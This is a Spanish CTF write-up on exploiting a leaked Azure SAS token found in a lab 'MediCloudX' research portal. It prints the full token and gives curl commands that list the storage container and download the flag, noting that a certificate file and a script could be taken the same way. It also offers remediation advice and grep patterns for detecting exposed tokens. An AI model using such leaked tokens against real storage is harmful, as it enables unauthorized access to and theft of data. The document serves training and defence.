# CTF Writeup: MediCloudX Labs Research I

## Información del Reto

- **Nombre**: MediCloudX Labs Research I
- **Puntos**: 464
- **Categoría**: Cloud Security / Azure / SAS Token
- **URL**: https://ctf25sac672da51.blob.core.windows.net/research-portal/research-portal.html

## Descripción

MediCloudX ha lanzado su nuevo portal principal para la unidad de negocio llamada MediCloudX Labs.

## Flag

```
CTF{m3d1cl0udx_4zur3_st0r4g3_s4s_t0k3n_3xf1ltr4t10n}
```

## Solución

### 1. Reconocimiento Inicial

Al analizar la URL proporcionada:

```
https://ctf25sac672da51.blob.core.windows.net/research-portal/research-portal.html
```

Información clave extraída:
- **Storage Account**: `ctf25sac672da51` (mismo del reto anterior)
- **Contenedor**: `research-portal`
- **Archivo**: `research-portal.html`
- **Endpoint**: Blob Storage (no static website)

### 2. Acceso al Portal HTML

```bash
curl -s https://ctf25sac672da51.blob.core.windows.net/research-portal/research-portal.html
```

El portal muestra:
- Información sobre investigación cardiovascular
- Portal de acceso a datos de investigación médica
- Referencias a archivos de datos clínicos
- **Una imagen cargada desde otro contenedor**

### 3. Análisis del Código Fuente HTML

Al revisar el código HTML, encontré una línea crítica:

```html
<img src="https://ctf25sac672da51.blob.core.windows.net/medicloud-research/close-up-doctor-holding-red-heart.jpg??sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
     alt="Cardiovascular Research - Doctor with Heart Model">
```

#### Descubrimiento Clave: SAS Token Expuesto

La URL de la imagen contiene un **Shared Access Signature (SAS) Token** completo con los siguientes parámetros:

| Parámetro | Valor | Significado |
|-----------|-------|-------------|
| `sv` | `2018-11-09` | Storage API Version |
| `sr` | `c` | **Signed Resource = Container** (no solo el blob) |
| `st` | `2025-11-17T20:20:21Z` | Start Time |
| `se` | `2026-11-17T20:20:21Z` | Expiry Time (válido por 1 año) |
| `sp` | `rl` | **Signed Permissions = Read + List** |
| `spr` | `https` | Signed Protocol |
| `sig` | `l3MOATfhF...` | Signature |

**Vulnerabilidades Identificadas**:
1. El SAS token está firmado para el **contenedor completo** (`sr=c`), no solo para el archivo individual
2. Tiene permisos de **List** (`l`) además de Read (`r`), permitiendo enumerar todos los archivos
3. El token es válido por **1 año completo**
4. Está expuesto públicamente en código HTML accesible

### 4. Explotación del SAS Token

#### Paso 1: Enumerar el Contenedor

Usando el SAS token descubierto, listé el contenido del contenedor `medicloud-research`:

```bash
curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research?restype=container&comp=list&sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
```

**Resultado**: Listado XML con 4 archivos:

```xml
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ServiceEndpoint="https://ctf25sac672da51.blob.core.windows.net/"
                    ContainerName="medicloud-research">
  <Blobs>
    <Blob>
      <Name>certificadob64delpfx.txt</Name>
      <Properties>
        <Content-Length>3492</Content-Length>
        <Content-Type>text/plain</Content-Type>
      </Properties>
    </Blob>
    <Blob>
      <Name>close-up-doctor-holding-red-heart.jpg</Name>
      <Properties>
        <Content-Length>13988495</Content-Length>
        <Content-Type>application/octet-stream</Content-Type>
      </Properties>
    </Blob>
    <Blob>
      <Name>flag.txt</Name>
      <Properties>
        <Content-Length>53</Content-Length>
        <Content-Type>text/plain</Content-Type>
      </Properties>
    </Blob>
    <Blob>
      <Name>script.ps1</Name>
      <Properties>
        <Content-Length>6553</Content-Length>
        <Content-Type>text/plain</Content-Type>
      </Properties>
    </Blob>
  </Blobs>
</EnumerationResults>
```

**Archivos Descubiertos**:
1. `certificadob64delpfx.txt` (3,492 bytes) - Posible certificado PFX en base64
2. `close-up-doctor-holding-red-heart.jpg` (13.9 MB) - Imagen médica
3. **`flag.txt`** (53 bytes) - **Objetivo**
4. `script.ps1` (6,553 bytes) - Script PowerShell

#### Paso 2: Descargar la Flag

Usando el mismo SAS token para acceder al archivo `flag.txt`:

```bash
curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/flag.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
```

**Output**:
```
CTF{m3d1cl0udx_4zur3_st0r4g3_s4s_t0k3n_3xf1ltr4t10n}
```

## Vulnerabilidad Técnica

### Descripción

**Azure SAS Token Exposure con Permisos Excesivos**

La vulnerabilidad consiste en la exposición de un Shared Access Signature (SAS) token en código HTML público con las siguientes fallas de seguridad:

### Problemas Identificados

1. **Scope Excesivo (sr=c)**:
   - El token está firmado para el **contenedor completo**
   - Debería estar firmado solo para el blob individual (`sr=b`)
   - Permite acceso a TODOS los archivos del contenedor

2. **Permisos Excesivos (sp=rl)**:
   - Incluye permiso de **List** (enumerar archivos)
   - Solo debería tener permiso de **Read** para el archivo específico
   - Permite descubrir archivos sensibles no intencionados

3. **Tiempo de Expiración Largo**:
   - Válido por **1 año completo**
   - Debería tener expiración corta (minutos u horas)
   - Aumenta la ventana de exposición

4. **Exposición Pública**:
   - SAS token visible en HTML público
   - Cualquiera puede extraerlo del código fuente
   - No hay autenticación adicional

### Impacto

- **Exfiltración de datos sensibles**: Acceso no autorizado a archivos médicos
- **Enumeración del contenedor**: Descubrimiento de todos los archivos almacenados
- **Exposición de credenciales**: Archivo `certificadob64delpfx.txt` potencialmente contiene certificados
- **Acceso persistente**: Token válido por 1 año permite acceso continuo

### Analogía con el Mundo Real

Esto es equivalente a:
- Publicar una llave maestra en un cartel público
- La llave abre no solo una puerta, sino todo un edificio
- La llave funciona durante todo un año
- Cualquiera puede copiar la llave del cartel

## Mejores Prácticas de Seguridad

### 1. SAS Token con Mínimo Privilegio

```bash
# ✅ CORRECTO: SAS para un blob específico con solo READ
az storage blob generate-sas \
  --account-name ctf25sac672da51 \
  --container-name medicloud-research \
  --name close-up-doctor-holding-red-heart.jpg \
  --permissions r \
  --expiry $(date -u -d "1 hour" '+%Y-%m-%dT%H:%MZ') \
  --https-only

# ❌ INCORRECTO: SAS para el contenedor completo con LIST
az storage container generate-sas \
  --account-name ctf25sac672da51 \
  --name medicloud-research \
  --permissions rl \
  --expiry $(date -u -d "1 year" '+%Y-%m-%dT%H:%MZ')
```

### 2. Comparación de Configuraciones

| Aspecto | ❌ Configuración Vulnerable | ✅ Configuración Segura |
|---------|----------------------------|------------------------|
| Scope | Container (`sr=c`) | Blob individual (`sr=b`) |
| Permisos | Read + List (`rl`) | Solo Read (`r`) |
| Expiración | 1 año | 1-4 horas máximo |
| Exposición | HTML público | Backend con autenticación |
| Protocolo | HTTPS (bien) | HTTPS (bien) |

### 3. Alternativas Seguras

#### Opción A: User Delegation SAS (Recomendado)

```bash
# Crear SAS delegado usando Azure AD
az storage blob generate-sas \
  --account-name ctf25sac672da51 \
  --container-name medicloud-research \
  --name image.jpg \
  --permissions r \
  --expiry $(date -u -d "2 hours" '+%Y-%m-%dT%H:%MZ') \
  --as-user \
  --auth-mode login
```

**Ventajas**:
- No usa las claves de la cuenta de almacenamiento
- Mejor auditoría con Azure AD
- Revocable mediante Azure AD

#### Opción B: Azure CDN con Token Authentication

```bash
# Configurar Azure CDN con autenticación personalizada
az cdn endpoint create \
  --resource-group myResourceGroup \
  --name myEndpoint \
  --profile-name myCDNProfile \
  --origin medicloudx.blob.core.windows.net \
  --origin-host-header medicloudx.blob.core.windows.net

# Habilitar token authentication en CDN
# Configurar reglas de autenticación personalizadas
```

#### Opción C: Azure Private Endpoints

```bash
# Deshabilitar acceso público
az storage account update \
  --name ctf25sac672da51 \
  --resource-group myResourceGroup \
  --public-network-access Disabled

# Crear private endpoint
az network private-endpoint create \
  --name myPrivateEndpoint \
  --resource-group myResourceGroup \
  --vnet-name myVNet \
  --subnet mySubnet \
  --private-connection-resource-id $storageAccountId \
  --connection-name myConnection \
  --group-id blob
```

### 4. Políticas de Seguridad con Azure Policy

```json
{
  "if": {
    "allOf": [
      {
        "field": "type",
        "equals": "Microsoft.Storage/storageAccounts/blobServices/containers"
      },
      {
        "field": "Microsoft.Storage/storageAccounts/blobServices/containers/publicAccess",
        "notEquals": "None"
      }
    ]
  },
  "then": {
    "effect": "deny"
  }
}
```

### 5. Monitoring y Alertas

```bash
# Configurar alertas para acceso con SAS tokens
az monitor activity-log alert create \
  --name "SAS-Token-Usage-Alert" \
  --resource-group myResourceGroup \
  --condition category=Security \
  --action-group myActionGroup

# Habilitar logging de Storage Analytics
az storage logging update \
  --account-name ctf25sac672da51 \
  --services b \
  --log rwd \
  --retention 90
```

## Herramientas Utilizadas

- `curl` - Cliente HTTP para peticiones web
- Análisis manual de código HTML
- Conocimiento de Azure SAS tokens
- Decodificación de parámetros de URL

## Comandos de Explotación Resumidos

```bash
# 1. Descargar el portal HTML
curl -s https://ctf25sac672da51.blob.core.windows.net/research-portal/research-portal.html > research-portal.html

# 2. Extraer el SAS token del HTML (o inspeccionarlo manualmente)
grep -oP 'https://ctf25sac672da51.blob.core.windows.net/medicloud-research/[^"]+' research-portal.html

# 3. Listar el contenedor usando el SAS token
curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research?restype=container&comp=list&sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"

# 4. Descargar la flag
curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/flag.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"

# 5. Opcionalmente, descargar otros archivos sensibles
curl "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/certificadob64delpfx.txt?[SAS]" -o certificado.txt
curl "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/script.ps1?[SAS]" -o script.ps1
```

## Anatomía de un SAS Token de Azure

### Componentes del Token

```
https://ctf25sac672da51.blob.core.windows.net/medicloud-research/file.jpg?
  sv=2018-11-09                              ← Storage API Version
  &sr=c                                       ← Signed Resource (b=blob, c=container, bs=blob snapshot)
  &st=2025-11-17T20:20:21Z                   ← Start Time (opcional)
  &se=2026-11-17T20:20:21Z                   ← Expiry Time (requerido)
  &sp=rl                                      ← Permissions (r=read, w=write, d=delete, l=list, etc.)
  &spr=https                                  ← Signed Protocol
  &sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D  ← HMAC-SHA256 Signature
```

### Permisos Disponibles en SAS Tokens

| Permiso | Código | Descripción |
|---------|--------|-------------|
| Read | `r` | Leer el contenido del blob |
| Add | `a` | Agregar bloques a un blob |
| Create | `c` | Crear un nuevo blob |
| Write | `w` | Escribir en el blob |
| Delete | `d` | Eliminar el blob |
| List | `l` | **Enumerar blobs en el contenedor** |
| Tags | `t` | Leer/escribir tags del blob |
| Move | `m` | Mover blob (Data Lake Gen2) |
| Execute | `e` | Ejecutar (Data Lake Gen2) |

### Niveles de Scope

| Scope | Código | Descripción | Riesgo |
|-------|--------|-------------|--------|
| Blob | `sr=b` | Solo un blob específico | Bajo |
| Blob Snapshot | `sr=bs` | Solo un snapshot | Bajo |
| **Container** | `sr=c` | **Todo el contenedor** | **Alto** |
| File Share | `sr=s` | Todo el file share | Alto |

## Lecciones Aprendidas

### 1. Nunca Exponer SAS Tokens en Cliente

**❌ MAL**:
```html
<img src="https://storage.blob.core.windows.net/container/image.jpg?sv=...&sp=rl&sig=...">
```

**✅ BIEN**:
```javascript
// Backend genera SAS temporal
app.get('/api/get-image-url', authenticate, (req, res) => {
  const sasUrl = generateBlobSAS(blobName, { permissions: 'r', expiresIn: '1h' });
  res.json({ url: sasUrl });
});

// Frontend solicita la URL al backend
fetch('/api/get-image-url')
  .then(r => r.json())
  .then(data => {
    imgElement.src = data.url;
  });
```

### 2. Principio de Mínimo Privilegio

- **Scope**: Lo más específico posible (blob individual, no contenedor)
- **Permisos**: Solo los necesarios (read, no list)
- **Tiempo**: Lo más corto posible (minutos/horas, no años)
- **Protocolo**: Solo HTTPS

### 3. SAS Token vs Stored Access Policy

| Característica | SAS Token Directo | Stored Access Policy |
|----------------|-------------------|----------------------|
| Revocación | Imposible | Posible |
| Gestión | Manual | Centralizada |
| Auditoría | Limitada | Completa |
| Recomendación | Solo para casos específicos | Preferido para producción |

### 4. Detección de SAS Tokens Expuestos

```bash
# Buscar SAS tokens en código
grep -r "sv=.*&sp=.*&sig=" .

# Buscar en repositorios Git
git grep -E "sv=.*&sp=.*&sig="

# Usar herramientas de escaneo
trufflehog git https://github.com/myorg/myrepo
gitleaks detect --source .
```

### 5. Rotación de Claves

```bash
# Rotar claves de la cuenta de almacenamiento regularmente
az storage account keys renew \
  --account-name ctf25sac672da51 \
  --key primary

# Regenerar SAS tokens después de rotación de claves
```

## Otros Archivos Interesantes Descubiertos

Aunque el objetivo era `flag.txt`, el contenedor también contenía:

### certificadob64delpfx.txt
- Posible certificado PFX codificado en Base64
- Podría contener claves privadas
- En un escenario real, sería crítico para escalación de privilegios

### script.ps1
- Script PowerShell de 6.5 KB
- Podría contener credenciales o lógica de automatización
- Vector potencial para análisis adicional

## Referencias

- [Azure SAS Token Best Practices](https://docs.microsoft.com/en-us/azure/storage/common/storage-sas-overview)
- [Azure Blob Storage Security](https://docs.microsoft.com/en-us/azure/storage/blobs/security-recommendations)
- [User Delegation SAS](https://docs.microsoft.com/en-us/azure/storage/common/storage-sas-overview#user-delegation-sas)
- [OWASP Cloud Security - SAS Token Exposure](https://owasp.org/www-project-cloud-security/)

---

**Fecha de resolución**: 21 de noviembre de 2025
**Autor**: CTF Team
**Dificultad**: Media (requiere análisis de código HTML y comprensión de SAS tokens)
